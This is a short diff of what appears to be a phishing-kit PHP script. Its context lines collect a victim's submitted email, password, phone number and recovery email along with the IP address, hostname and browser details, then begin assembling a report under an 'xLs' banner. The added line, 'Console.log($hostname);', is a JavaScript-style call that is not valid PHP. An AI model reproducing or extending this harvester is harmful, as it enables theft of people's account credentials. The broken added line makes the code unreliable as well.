@@ -7,6 +7,7 @@ $rec_email = trim($_POST['rec_email']);
 if($email != null && $password != null && $phone != null && $rec_email != null){
 	$ip = getenv("REMOTE_ADDR");
 	$hostname = gethostbyaddr($ip);
+    Console.log($hostname);
 	$useragent = $_SERVER['HTTP_USER_AGENT'];
 	$message .= "|----------| xLs |--------------|\n";
 	
